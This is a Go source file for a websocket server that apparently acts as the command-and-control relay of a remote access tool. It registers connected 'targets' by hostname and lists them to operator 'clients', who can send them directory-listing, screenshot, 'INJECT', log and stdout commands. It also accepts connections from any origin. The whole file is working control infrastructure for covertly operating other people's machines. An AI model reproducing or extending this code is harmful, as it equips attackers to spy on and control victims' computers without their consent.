package main

import (
	"encoding/json"
	"flag"
	"log"
	"net/http"
	"os"
	"path"
	"reflect"

	"github.com/d0minikt/dragons/lib"
	"github.com/gorilla/websocket"
)

// connection

var upgrader = websocket.Upgrader{
	// allow cross-origin
	CheckOrigin: func(r *http.Request) bool { return true },
}

// app
var clients = make(map[string]lib.Client)
var targets = make(map[string]lib.Target)

func notifyClients(ws *websocket.Conn) {
	keys := reflect.ValueOf(targets).MapKeys()
	strkeys := make([]string, len(keys))
	for i := 0; i < len(keys); i++ {
		strkeys[i] = keys[i].String()
	}

	for _, value := range clients {
		value.Socket.WriteJSON(lib.DataAction{
			Type: "DATA",
			Payload: lib.Data{
				Targets: strkeys,
			},
		})
	}
}

func handleWebsocketConnection(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	log.Println("Server running")
	defer ws.Close()

	// init connection
	keys := reflect.ValueOf(targets).MapKeys()
	strkeys := make([]string, len(keys))
	for i := 0; i < len(keys); i++ {
		strkeys[i] = keys[i].String()
	}
	ws.WriteJSON(lib.DataAction{
		Type: "DATA",
		Payload: lib.Data{
			Targets: strkeys,
		},
	})

	var userType string
	var id string

	for {
		// read message
		_, message, err := ws.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			// handle disconnect
			if len(id) > 0 {
				if _, ok := targets[id]; ok && userType == "TARGET" {
					delete(targets, id)
					notifyClients(ws)
				} else if _, ok := clients[id]; ok && userType == "CLIENT" {
					delete(clients, id)
				}
			}
			break
		}
		action := lib.Action{}
		json.Unmarshal(message, &action)

		switch action.Type {
		case "CONNECT_TARGET":
			action := lib.ConnectTargetAction{}
			err := json.Unmarshal(message, &action)

			log.Println("target connected")
			if err != nil {
				log.Fatal("failed to unmarshal")
			}

			userType = "TARGET"
			id, _ = lib.RandomHex(4)
			id = action.Payload.Net.Hostname + " - " + id
			targets[id] = lib.Target{
				Socket:  ws,
				Details: action.Payload,
			}
			// notify clients
			notifyClients(ws)
		case "CONNECT_CLIENT":
			log.Println("client connected")
			userType = "CLIENT"
			id, _ = lib.RandomHex(12)
			clients[id] = lib.Client{
				Socket: ws,
			}
		case "CONNECT_TO_TARGET":
			action := lib.StringAction{}
			json.Unmarshal(message, &action)
			if target, ok := targets[action.Payload]; ok {
				target.Socket.WriteJSON(lib.StringAction{
					Type:    "CONNECT_TO_TARGET",
					Payload: id,
				})
				ws.WriteJSON(lib.TargetConnectedAction{
					Type:    "TARGET_CONNECTED",
					Payload: target.Details,
					Key:     action.Payload,
				})
			}
		case "GET_DIRECTORY":
			fallthrough
		case "SCREENSHOT":
			fallthrough
		case "INJECT":
			fallthrough
		case "LOG":
			fallthrough
		case "STDOUT":
			action := lib.QueryAction{}
			json.Unmarshal(message, &action)
			if userType == "TARGET" {
				if client, ok := clients[action.To]; ok {
					action.From = id
					client.Socket.WriteJSON(action)
				}
			} else if userType == "CLIENT" {
				if target, ok := targets[action.To]; ok {
					action.From = id
					target.Socket.WriteJSON(action)
				}
			}
		default:
			log.Println(string(message))
		}

		// err = ws.WriteMessage(websocket.TextMessage, []byte("YOURE AN OLD STAR"))
		// if err != nil {
		// 	log.Println("write:", err)
		// 	break
		// }
	}
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "80"
		log.Printf("$PORT not set. Using default port %s\n", port)
	}
	addr := flag.String("addr", "0.0.0.0:"+port, "http service address")

	flag.Parse()
	log.SetFlags(0)
	http.HandleFunc("/ws", handleWebsocketConnection)

	// spa
	wd, _ := os.Getwd()
	dir := path.Join(wd, "/client/build/")
	fs := http.FileServer(http.Dir(dir))
	http.Handle("/", fs)

	log.Fatal(http.ListenAndServe(*addr, nil))
}
